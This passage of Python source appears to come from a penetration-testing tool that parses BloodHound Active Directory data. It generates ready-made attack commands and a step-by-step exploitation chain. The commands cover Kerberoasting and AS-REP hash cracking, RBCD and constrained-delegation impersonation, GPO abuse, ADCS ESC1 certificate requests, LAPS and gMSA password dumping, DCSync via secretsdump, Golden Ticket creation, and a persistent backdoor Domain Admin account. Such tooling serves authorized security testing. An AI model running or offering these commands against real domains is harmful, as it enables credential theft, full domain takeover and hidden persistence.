                        "Can modify object attributes - enable AS-REP Roasting or add SPN for Kerberoasting. NOTE: GenericWrite does NOT allow adding to groups.")

        if right_lower == 'readgmsapassword':
            return ('HIGH',
                    f"gMSADumper.py -u '{principal_name}' -p '[PASSWORD]' -d {domain}",
                    f"Can extract gMSA password for {target} and authenticate as service account")

        if right_lower == 'readlapspassword':
            return ('HIGH',
                    f"crackmapexec ldap {target_addr} -u '{principal_name}' -p '[PASSWORD]' --kdcHost {target_addr} -M laps",
                    f"Can read LAPS password for {target} - local admin access")

        # RBCD and delegation
        if right_lower == 'allowedtoact' or right_lower == 'writepropertyallowedtoact':
            return ('CRITICAL',
                    f"rbcd.py -delegate-from '{principal_name}' -delegate-to '{target_name}' -dc-ip {target_addr} -action write '{domain}/{principal_name}:[PASSWORD]'",
                    "Resource-Based Constrained Delegation - can impersonate any user to target")

        if right_lower == 'allowedtodelegate':
            return ('HIGH',
                    f"getST.py -spn 'cifs/{target_name}' -impersonate Administrator '{domain}/{principal_name}:[PASSWORD]' -dc-ip {target_addr}",
                    f"Constrained delegation - {principal} can impersonate users to {target}. NOTE: This is NOT a coercion vulnerability (PetitPotam/PrinterBug). Requires {principal} compromise first.")

        # GPO and ADCS
        if right_lower == 'gplink':
            return ('HIGH',
                    f"# 1. Create malicious GPO:\nSharpGPOAbuse.exe --AddLocalAdmin --UserAccount '{principal_name}' --GPOName 'CustomGPO'\n# 2. Link GPO to OU:\npyGPOAbuse.py '{domain}/{principal_name}:[PASSWORD]' -gpo-id '<GPO-ID>' -dc-ip {target_addr}",
                    f"Can link malicious GPO to {target} - gain local admin or deploy backdoors")

        if right_lower in ['enrollonbehalfof', 'adcsesc1']:
            return ('HIGH',
                    f"certipy req -u '{principal_name}@{domain}' -p '[PASSWORD]' -ca 'CA-NAME' -template 'VulnerableTemplate' -target {target_addr} -on-behalf-of '{domain}\\Administrator' -pfx admin.pfx",
                    f"ADCS ESC1 - can request certificate on behalf of any user including Domain Admin")

        # Check for dangerous principals
        if principal_lower in ['everyone', 'authenticated users', 's-1-1-0', 's-1-5-11']:
            if right_lower not in ['readproperty', 'readcontrol']:
                return ('CRITICAL',
                        f"ANY domain user can abuse {right_name} on {target}",
                        "Overly permissive ACE - any authenticated user can exploit")

        # MEDIUM risks
        if right_lower in ['member of', 'admincount']:
            return ('MEDIUM', '', '')

        return ('LOW', '', '')


    @staticmethod
    def _generate_decision_tree(property_vulns: List[Dict], attack_paths: List[Dict]) -> str:
        """Generate decision tree based on found vulnerabilities"""
        tree = []
        tree.append("```")
        tree.append("BLOODHOUND EXPLOITATION DECISION TREE")
        tree.append("|")

        # Check for immediate wins
        has_password_not_req = any(v['type'] == 'PASSWORD NOT REQUIRED' for v in property_vulns)
        has_asrep = any(v['type'] == 'AS-REP ROASTING' for v in property_vulns)
        has_kerberoast = any(v['type'] == 'KERBEROASTABLE' for v in property_vulns)
        has_shadow_creds = any('addkeycredentiallink' in p['relationship'].lower() for p in attack_paths)
        has_critical_ace = any(p['risk'] == 'CRITICAL' for p in attack_paths)

        if has_password_not_req:
            tree.append("+-- [IMMEDIATE] Password Not Required Accounts Found")
            tree.append("    |")
            tree.append("    +-- Try authentication with blank password")
            tree.append("    +-- Try common defaults (Password123, Welcome1, etc.)")
            tree.append("    +-- If successful: You have valid domain credentials")
            tree.append("    |   +-- Enumerate further with BloodHound")
            tree.append("    |   +-- Check for lateral movement opportunities")
            tree.append("    |")

        if has_asrep:
            tree.append("+-- [IMMEDIATE] AS-REP Roastable Accounts Found")
            tree.append("    |")
            tree.append("    +-- No credentials required - request AS-REP hash")
            tree.append("    +-- Crack hash offline with hashcat/john")
            tree.append("    +-- If cracked: Valid domain credentials obtained")
            tree.append("    |")

        if has_kerberoast:
            tree.append("+-- [HIGH PRIORITY] Kerberoastable Accounts Found")
            tree.append("    |")
            tree.append("    +-- Requires ANY domain user account")
            tree.append("    +-- Request TGS tickets for SPN accounts")
            tree.append("    +-- Crack tickets offline (often succeeds on old accounts)")
            tree.append("    +-- Target high-value accounts first (DA, admin accounts)")
            tree.append("    |")

        if has_shadow_creds:
            tree.append("+-- [CRITICAL] Shadow Credentials Attack Path Found")
            tree.append("    |")
            tree.append("    +-- Requires: Control of source account + AddKeyCredentialLink permission")
            tree.append("    +-- Use Whisker/Certipy to add msDS-KeyCredentialLink")
            tree.append("    +-- Authenticate as target without knowing password")
            tree.append("    +-- No modification of password (stealthy)")
            tree.append("    |")

        if has_critical_ace:
            tree.append("+-- [CRITICAL] Dangerous ACL Permissions Found")
            tree.append("    |")
            tree.append("    +-- GenericAll/WriteDacl/WriteOwner on high-value targets")
            tree.append("    +-- Compromise source account first")
            tree.append("    +-- Then abuse ACL to compromise target")
            tree.append("    +-- Chain multiple ACL abuses to reach Domain Admins")
            tree.append("    |")

        tree.append("+-- [DECISION POINT] Choose Attack Path")
        tree.append("    |")
        tree.append("    +-- No credentials? → Start with AS-REP Roasting")
        tree.append("    +-- Have low-priv account? → Kerberoasting")
        tree.append("    +-- Have specific account? → Check ACL paths from that account")
        tree.append("    +-- Have admin on one machine? → Dump credentials, pivot")
        tree.append("")
        tree.append("```")

        return "\n".join(tree)

    @staticmethod
    def _generate_attack_chain(property_vulns: List[Dict], attack_paths: List[Dict]) -> str:
        """Generate multi-step attack chain with prerequisites and dependencies"""
        chain = []
        chain.append("## EXPLOITATION CHAIN (Step-by-Step Guide)")
        chain.append("")

        # Analyze dependencies and create attack sequence
        no_creds_required = [v for v in property_vulns if v['type'] in ['AS-REP ROASTING', 'PASSWORD NOT REQUIRED']]
        any_user_required = [v for v in property_vulns if v['type'] == 'KERBEROASTABLE']
        critical_paths = [p for p in attack_paths if p['risk'] == 'CRITICAL']
        high_paths = [p for p in attack_paths if p['risk'] == 'HIGH']

        step_number = 1

        # STEP 1: Initial Access (if no creds)
        if no_creds_required:
            chain.append(f"### STEP {step_number}: Initial Access (No Credentials Required)")
            step_number += 1
            chain.append("")

            for vuln in no_creds_required[:3]:  # Top 3
                chain.append(f"**Target:** {vuln['account']}")
                chain.append(f"**Vulnerability:** {vuln['type']}")
                chain.append("")
                chain.append("**Commands:**")
                chain.append("```bash")
                chain.append(f"# {vuln['details']}")
                chain.append(vuln['exploit'])
                chain.append("")
                if vuln['type'] == 'AS-REP ROASTING':
                    chain.append("# Crack the hash")
                    account_name = vuln['account'].split('@')[0]
                    chain.append(f"hashcat -m 18200 asrep_{account_name}.txt /usr/share/wordlists/rockyou.txt --force")
                chain.append("```")
                chain.append("")

            chain.append("**Success Condition:** Valid domain credentials obtained")
            chain.append(f"**Next Step:** Proceed to Step {step_number}")
            chain.append("")

        # STEP 2: Credential harvesting (if any domain user works)
        if any_user_required:
            chain.append(f"### STEP {step_number}: Credential Harvesting (Requires Any Domain User)")
            step_number += 1
            chain.append("")
            chain.append(f"**Prerequisites:** Valid domain credentials from Step {step_number - 1}")
            chain.append("")

            for vuln in any_user_required[:3]:  # Top 3
                chain.append(f"**Target:** {vuln['account']}")
                chain.append(f"**Attack:** {vuln['type']}")
                chain.append("")
                chain.append("**Commands:**")
                chain.append("```bash")
                chain.append(vuln['exploit'])
                chain.append("")
                chain.append("# Crack the ticket")
                account_name = vuln['account'].split('@')[0]
                chain.append(f"hashcat -m 13100 tgs_{account_name}.txt /usr/share/wordlists/rockyou.txt --force")
                chain.append("```")
                chain.append("")

            chain.append("**Success Condition:** Additional privileged account credentials")
            chain.append(f"**Next Step:** Proceed to Step {step_number}")
            chain.append("")

        # STEP 3: ACL Abuse (if critical paths exist)
        if critical_paths:
            chain.append(f"### STEP {step_number}: ACL Abuse for Privilege Escalation")
            step_number += 1
            chain.append("")
            chain.append(f"**Prerequisites:** Compromised account with ACL permissions")
            chain.append("")

            for idx, path in enumerate(critical_paths[:5], 1):  # Top 5 critical
                chain.append(f"**Path {idx}:** {path['source']} → {path['target']}")
                chain.append(f"**Permission:** {path['relationship']}")
                chain.append(f"**Risk:** {path['risk']}")
                chain.append("")
                chain.append("**Exploitation:**")
                chain.append("```bash")
                if path.get('exploit'):
                    chain.append(path['exploit'])
                    chain.append("")
                    # Add follow-up commands
                    if 'dcsync' in path['relationship'].lower() or 'getchanges' in path['relationship'].lower():
                        chain.append("# After DCSync, create Golden Ticket")
                        domain = BloodHoundAnalyzer._extract_domain_from_name(path['target'])
                        chain.append(f"ticketer.py -nthash [KRBTGT_HASH] -domain-sid [DOMAIN_SID] -domain {domain} Administrator")
                    elif 'genericall' in path['relationship'].lower() and 'domain admins' in path['target'].lower():
                        chain.append("# Add your user to Domain Admins")
                        domain = BloodHoundAnalyzer._extract_domain_from_name(path['target'])
                        target_addr = BloodHoundAnalyzer._get_target_address(path['target'])
                        principal = path['source'].split('@')[0]
                        chain.append(f"net rpc group addmem 'Domain Admins' '{principal}' -U {domain}/{principal}%[PASSWORD] -S {target_addr}")
                chain.append("```")
                chain.append("")

            chain.append("**Success Condition:** Domain Admin privileges or equivalent")
            chain.append("")

        # STEP 4: Post-Exploitation
        if critical_paths or any_user_required:
            chain.append(f"### STEP {step_number}: Post-Exploitation & Persistence")
            chain.append("")
            chain.append("**Commands:**")
            chain.append("```bash")
            chain.append("# Dump all domain credentials")
            if BloodHoundAnalyzer._context_cache['dc_list']:
                dc_addr = BloodHoundAnalyzer._get_target_address(BloodHoundAnalyzer._context_cache['dc_list'][0])
                domain = BloodHoundAnalyzer._context_cache['domain'] or "DOMAIN.LOCAL"
                chain.append(f"secretsdump.py {domain}/Administrator:[PASSWORD]@{dc_addr} -just-dc-ntlm -outputfile domain_hashes")
            else:
                chain.append("secretsdump.py DOMAIN/Administrator:[PASSWORD]@DC_IP -just-dc-ntlm -outputfile domain_hashes")
            chain.append("")
            chain.append("# Create Golden Ticket for persistence")
            chain.append("ticketer.py -nthash [KRBTGT_HASH] -domain-sid [DOMAIN_SID] -domain DOMAIN.LOCAL Administrator")
            chain.append("")
            chain.append("# Create backup admin account")
            chain.append("net user backup_admin ComplexP@ss123! /add /domain")
            chain.append("net group 'Domain Admins' backup_admin /add /domain")
            chain.append("```")
            chain.append("")

        if not no_creds_required and not any_user_required and not critical_paths:
            chain.append("**No clear attack chain identified.**")
            chain.append("")
            chain.append("This could mean:")
            chain.append("- Well-hardened environment")
            chain.append("- Limited BloodHound data (partial collection)")
            chain.append("- Manual analysis required for complex attack paths")
            chain.append("")

        return "\n".join(chain)

    @staticmethod
    def _correlate_windows_cves(computer_info: List[Dict]) -> Dict[str, List[Dict]]:
        """
        Query CVE database for Windows hosts (Phase 2 - CVE Cross-Reference)
        Returns dict mapping computer names to CVEs with exploits
        """
        try:
            # Import CVE engine (same as Nmap uses)
            import sys
            from pathlib import Path
            _base = Path(sys._MEIPASS) if getattr(sys, 'frozen', False) else Path(__file__).resolve().parent
            sys.path.insert(0, str(_base / 'rag_engine'))
            from cve_query_engine import CVEQueryEngine

            cve_engine = CVEQueryEngine(
                cve_db_path=str(_base / "rag_engine" / "cve_database.db"),
                exploit_db_path=str(_base / "rag_engine" / "exploit_database.db")
            )
            results = {}

            for computer in computer_info:
                computer_name = computer['name']
                os_name = computer['os']
                os_version = computer['version']

                # Parse OS to vendor/product/version
                vendor, product, version = BloodHoundAnalyzer._parse_windows_os(os_name, os_version)

                if not product:
                    continue

                # Query CVE database
                cves = cve_engine.query_cves_for_service(vendor, product, version, version_extra_info="")

                if cves:
                    results[computer_name] = []
                    for cve in cves[:5]:  # Top 5 CVEs
                        cve_data = {
                            'cve_id': cve.cve_id,
                            'cvss': cve.cvss_score,
                            'severity': cve.severity,
                            'description': cve.description[:150] + "..." if len(cve.description) > 150 else cve.description,
                            'confidence': cve.confidence,
                            'has_exploit': cve.has_exploit,
                            'exploits': []
                        }

                        # Get exploits if available
                        if cve.has_exploit:
                            exploits = cve_engine.get_exploits_for_cve(cve.cve_id)
                            if exploits:
                                cve_data['exploits'] = [{
                                    'edb_id': exp['edb_id'],
                                    'title': exp['title'],
                                    'is_remote': exp.get('is_remote', False)
                                } for exp in exploits[:2]]  # Top 2 exploits per CVE

                        results[computer_name].append(cve_data)

            return results

        except ImportError:
            # CVE engine not available
            return {}
        except Exception as e:
            # Fail gracefully
            print(f"[WARNING] CVE correlation failed: {e}")
            return {}

    @staticmethod
    def _parse_windows_os(os_name: str, os_version: str) -> Tuple[str, str, str]:
        """Parse Windows OS name and version to vendor/product/version for CVE lookup"""
        vendor = "microsoft"
        product = ""
        version = os_version

        os_lower = os_name.lower()

        # Determine product
        if "server 2022" in os_lower:
            product = "windows_server_2022"
        elif "server 2019" in os_lower:
            product = "windows_server_2019"
        elif "server 2016" in os_lower:
            product = "windows_server_2016"
        elif "server 2012 r2" in os_lower:
            product = "windows_server_2012_r2"
        elif "server 2012" in os_lower:
            product = "windows_server_2012"
        elif "server 2008 r2" in os_lower:
            product = "windows_server_2008_r2"
        elif "server 2008" in os_lower:
            product = "windows_server_2008"
        elif "windows 11" in os_lower:
            product = "windows_11"
        elif "windows 10" in os_lower:
            product = "windows_10"
        elif "windows 8.1" in os_lower:
            product = "windows_8.1"
        elif "windows 8" in os_lower:
            product = "windows_8"
        elif "windows 7" in os_lower:
            product = "windows_7"

        return vendor, product, version

    @staticmethod
    def _enrich_with_ad_cves(attack_paths: List[Dict]) -> List[Dict]:
        """
        Enrich attack paths with known AD CVEs (Phase 2)
        Links techniques like Unconstrained Delegation to PrintNightmare CVE
        """
        try:
            from pathlib import Path
            import sys
            _base = Path(sys._MEIPASS) if getattr(sys, 'frozen', False) else Path(__file__).resolve().parent
            sys.path.insert(0, str(_base / 'rag_engine'))
            from cve_query_engine import CVEQueryEngine

            cve_engine = CVEQueryEngine(
                cve_db_path=str(_base / "rag_engine" / "cve_database.db"),
                exploit_db_path=str(_base / "rag_engine" / "exploit_database.db")
            )

            for path in attack_paths:
                relationship = path['relationship'].lower()

                # Check if this relationship maps to a known AD CVE
                technique_key = None

                if 'unconstrained' in relationship or 'allowedtodelegate' in relationship:
                    technique_key = 'printnightmare'  # PrinterBug/PetitPotam coercion
                elif 'dcsync' in relationship or 'getchanges' in relationship:
                    # DCSync can be combined with ZeroLogon
                    technique_key = 'zerologon'

                if technique_key and technique_key in BloodHoundAnalyzer.AD_TECHNIQUE_TO_CVE:
                    mapping = BloodHoundAnalyzer.AD_TECHNIQUE_TO_CVE[technique_key]
                    path['ad_cve_correlation'] = {
                        'description': mapping['description'],
                        'cves': [],
                        'references': mapping['references']
                    }

                    # Query exploits for each CVE
                    for cve_id in mapping['cves']:
                        exploits = cve_engine.get_exploits_for_cve(cve_id)
                        if exploits:
                            path['ad_cve_correlation']['cves'].append({
                                'cve_id': cve_id,
                                'exploits': [{'edb_id': exp['edb_id'], 'title': exp['title']} for exp in exploits[:2]]
                            })

            return attack_paths

        except ImportError:
            return attack_paths
        except Exception as e:
            print(f"[WARNING] AD CVE enrichment failed: {e}")
            return attack_paths

    @staticmethod
    def _detect_output_type(text: str) -> str:
        """Determine what type of BloodHound output this is"""
        if re.search(r'"nodes":\s*\[', text, re.IGNORECASE):
            return "JSON Export (Full Dataset)"
        elif re.search(r'MATCH.*RETURN', text, re.IGNORECASE):
            return "Cypher Query"
        elif re.search(r'SharpHound|Resolved Collection Methods', text, re.IGNORECASE):
            return "SharpHound Collection Output"
        elif re.search(r'(User|Computer|Group)\s*-\[.*\]->', text, re.IGNORECASE):
            return "Attack Path Visualization"
        else:
            return "BloodHound Analysis Results"

    @staticmethod
    def _extract_attack_paths(text: str) -> List[Dict[str, str]]:
        """Extract attack paths from BloodHound output (text-based fallback)"""
        paths = []
        path_id = 1

        # Pattern: (Source)-[Relationship]->(Target)
        # Example: (USER@DOMAIN)-[AdminTo]->(COMPUTER@DOMAIN)
        path_pattern = r'\(([^)]+)\)-\[([^\]]+)\]->\(([^)]+)\)'

        for match in re.finditer(path_pattern, text, re.IGNORECASE):
            source = match.group(1).strip()
            relationship = match.group(2).strip().replace(':', '').strip()
            target = match.group(3).strip()

            # Determine risk level
            risk = "MEDIUM"
            relationship_lower = relationship.lower()

            if any(high_risk in relationship_lower for high_risk in
                   ['dcsync', 'writedacl', 'writeowner', 'genericall', 'forcechangepassword', 'addkeycredentiallink']):
                risk = "CRITICAL"
            elif any(med_risk in relationship_lower for med_risk in
                     ['adminTo', 'memberof', 'owns', 'allextendedrights']):
                risk = "HIGH"

            # Get relationship description
            rel_desc = BloodHoundAnalyzer.ATTACK_PATHS.get(relationship_lower, relationship)

            paths.append({
                'id': path_id,
                'source': source,
                'target': target,
                'relationship': relationship,
                'description': rel_desc,
                'risk': risk
            })
            path_id += 1

        return paths

    @staticmethod
    def _find_high_value_targets(text: str) -> List[Dict[str, str]]:
        """Identify high-value targets mentioned in output"""
        targets = []
        text_lower = text.lower()

        for target_name, description in BloodHoundAnalyzer.HIGH_VALUE_TARGETS.items():
            if target_name in text_lower:
                # Try to extract more context
                context_match = re.search(rf'({target_name}[^,\n]*)', text_lower)
                full_name = context_match.group(1) if context_match else target_name

                targets.append({
                    'name': full_name.strip(),
                    'type': description,
                    'why': 'Critical privileged access to domain resources'
                })

        return targets

    @staticmethod
    def _find_acl_issues(text: str) -> List[Dict[str, str]]:
        """Find ACL/permission misconfigurations (text-based fallback)"""
        issues = []

        # Dangerous permissions
        dangerous_perms = {
            'GenericAll': 'Full control over object - can modify anything',
            'WriteDacl': 'Can modify permissions - grant yourself any access',
            'WriteOwner': 'Can take ownership - become owner and modify',
            'ForceChangePassword': 'Can reset password - compromise account',
            'AllExtendedRights': 'All extended rights - includes dangerous operations',
            'DCSync': 'Can replicate directory - dump all password hashes',
        }

        text_lower = text.lower()

        for perm, impact in dangerous_perms.items():
            perm_lower = perm.lower()
            if perm_lower in text_lower:
                # Try to extract principal and target
                pattern = rf'([^\s]+)\s*-\[.*{perm_lower}.*\]->\s*([^\s]+)'
                matches = re.finditer(pattern, text_lower)

                for match in matches:
                    principal = match.group(1).strip()
                    target = match.group(2).strip()

                    issues.append({
                        'principal': principal,
                        'permission': perm,
                        'target': target,
                        'impact': impact
                    })

        return issues

    @classmethod
    def analyze(cls, text: str) -> Optional[Tuple[str, Optional[Dict]]]:
        """
        Main analysis entry point for UI components.
        Detects if text is BloodHound output and returns analysis tuple.
        """
        if not cls.detect_bloodhound_output(text):
            return None, None

        return cls.analyze_bloodhound_output(text)


# Helper function for easy integration with the backend dispatcher
def analyze_bloodhound_output(query: str) -> Optional[str]:
    """
    Convenience function to detect and analyze BloodHound output for the dispatcher.
    Returns analysis string if BloodHound output detected, None otherwise.
    """
    if not BloodHoundAnalyzer.detect_bloodhound_output(query):
        return None

    # Call the core analyzer, which returns a tuple (report_string, vulnerabilities)
    report_string, _ = BloodHoundAnalyzer.analyze_bloodhound_output(query)

    # The dispatcher only needs the string report
    return report_string


# ZIP file support
def analyze_bloodhound_zip(zip_path: str) -> Tuple[str, Optional[Dict]]:
    """
    Analyze BloodHound ZIP file directly.
    Extracts and analyzes all JSON files from the ZIP.
    Returns a tuple of (report_string, vulnerabilities_dict).
    """
    try:
        combined_data = {'data': []}
        report_findings = ["# [!] BLOODHOUND ACTIVE DIRECTORY ANALYSIS\n"]
        report_findings.append(f"**Detected Output Type**: SharpHound ZIP Export\n")

        with zipfile.ZipFile(zip_path, 'r') as zf:
            json_files = [f for f in zf.namelist() if f.endswith('.json')]
            if not json_files:
                return ("# [INFO] No .json files found in the ZIP archive.", None)

            for filename in json_files:
                with zf.open(filename) as f:
                    try:
                        file_data = json.load(f)
                        # The actual data is in the 'data' key for most files
                        if isinstance(file_data, dict) and 'data' in file_data:
                            combined_data['data'].extend(file_data['data'])
                        # For files like users.json, the data is a list at the root
                        elif isinstance(file_data, list):
                            combined_data['data'].extend(file_data)
                    except (json.JSONDecodeError, TypeError):
                        continue

        if combined_data['data']:
            vulnerabilities = BloodHoundAnalyzer._analyze_json_data(combined_data)
            report = BloodHoundAnalyzer._generate_report(vulnerabilities)
            report_findings.append(report)
            return ("\n".join(report_findings), vulnerabilities)

        return ("# [INFO] Could not find valid BloodHound data objects in the provided ZIP file.", None)

    except (zipfile.BadZipFile, FileNotFoundError) as e:
        return (f"# [ERROR] Failed to analyze ZIP file: {e}", None)
    except Exception as e:
        # Catch any other unexpected errors
        return (f"# [CRITICAL ERROR] An unexpected error occurred during ZIP analysis: {e}", None)
